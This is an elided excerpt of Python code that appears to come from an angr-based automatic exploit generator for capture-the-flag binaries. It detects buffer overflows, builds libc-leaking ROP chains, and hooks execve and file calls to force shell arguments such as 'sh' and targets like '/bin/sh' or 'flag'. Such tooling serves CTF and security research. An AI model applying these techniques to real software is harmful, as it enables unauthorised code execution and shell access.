...
def get_leak_rop_chain(properties, leak_num=-1):
    ...
    for function in print_functions:
        log.debug(function)
        log.debug(elf.sym)
        if function in elf.sym:
            ret_func = elf.sym[function]
            break
    ...
    # print((retrigger_addr.rebased_addr))
...
def get_rop_chain(properties, state=None):
    ...
    if properties["protections"]["arch"] == 'i386':
    ...
    if properties.get("libc", None):
        ...
        if isinstance(properties["libc"], dict):
            ...
            # Find the function we want to call
            for function in functions:
                if function in libc.sym:
                    ret_func = libc.sym[function]
                    break
...
def overflow_detect_filter(simgr):
    ...
    for state in simgr.found:
        if state.globals["type"] == "test_overflow":
            user_input = state.globals["user_input"]
            input_bytes = state.solver.eval(user_input, cast_to=bytes)
            log.info("[+] Vulnerable path found {}".format(input_bytes))
            state.globals["type"] = "overflow_variable"
    ...
    for state in simgr.unconstrained:
        ...
        # Check satisfiability ke man zu xing
        # extra_constraints = yueshu shuzu 
...
def point_to_win_filter(simgr):
    ...
    for state in simgr.unconstrained:
        ...
        for func in properties["win_functions"]:
            if properties["win_functions"][func]["flags"] == 1:
                address = properties["win_functions"][func]["from"]
            else:
...
class hook_execve(angr.SimProcedure):
    IS_FUNCTION = True
    ...
    def run(self,payload):
        ...
        # print(self.state.solver.eval(self.state.memory.load(payload,0x10),cast_to = bytes))
        num_count = self.state.arch.bits / 8
        ...
        arg = self.state.solver.eval(self.state.memory.load(payload,32), cast_to=bytes)
        log.info("execve() called with {}".format(arg))
        
        if any(x in arg for x in self.good_strings):
            # Win!
            self.state.globals["type"] = "overflow_variable"
        elif self.state.solver.satisfiable(extra_constraints=[b"\x00" * 8 in arg]):
            log.info("control argv")
            # if self.state.arch.bits == 64:
            #     cmd_ptr = self.state.regs.rdi
            # if self.state.arch.bits == 32:
            #     cmd_ptr = self.state.memory.load(self.state.regs.sp - 4, 4)
            # cmd_ptr = self.state.memory.load(payload,32)
            bits = self.state.arch.bits
            num_count = int(bits / 8)
            arg_value = b"sh" + b"\x00"*(num_count - 2)
            self.state.add_constraints(arg_value == self.state.memory.load(payload,num_count))
            self.state.globals["type"] = "test_overflow"


class get_win_regs(angr.SimProcedure):
    IS_FUNCTION = True

    good_strings = [b"/bin/sh", b"flag", b"/bin/bash", b"/bin/dash", b'.pass']
    ...
    def run(self,payload):
        ...
        arg = self.state.solver.eval(self.state.memory.load(payload,32), cast_to=bytes)
        log.info("called with {}".format(arg))
        
        if any(x in arg for x in self.good_strings):
            # Win!
            self.state.globals["type"] = "test_test"

class get_open_regs(angr.SimProcedure):
    IS_FUNCTION = True

    good_strings = [b"flag", b'.pass']
    def run(self,payload):
        ...
        if any(x in arg for x in self.good_strings):
            # Win!
            self.state.globals["type"] = "open_flag"

class get_write_regs(angr.SimProcedure):
    IS_FUNCTION = True

    good_strings = [b"flag", b'.pass']
    def run(self,flags,payload,size):
        ...
        if any(x in arg for x in self.good_strings):
            # Win!
            self.state.globals["type"] = "write_flag"

class get_read_regs(angr.SimProcedure):
    IS_FUNCTION = True
...
class hook_win(angr.SimProcedure):
    ...
    def run(self,payload):
        ...
        # bits = self.state.arch.bits
        # print(self.state.solver.eval(self.state.memory.load(payload,0x10),cast_to = bytes))
        num_count = int(self.state.arch.bits / 8)
        ...
        if any(x in arg for x in self.good_strings):
            ...
            print(([self.state.solver.symbolic(payload[i]) for i in range(num_count)]))
            log.info("control argv")
            # if self.state.arch.bits == 64:
            #     cmd_ptr = self.state.regs.rdi
            # if self.state.arch.bits == 32:
            ...
            # cmd_ptr = self.state.memory.load(payload,32)
            bits = self.state.arch.bits
            arg_value = b"sh;" + b"\x00"*(num_count - 3)
            # cmd_str = self.state.memory.load(payload, num_count)
            # print(cmd_str)
            self.state.add_constraints(arg_value == self.state.memory.load(payload,num_count))
            self.state.globals["type"] = "test_overflow"
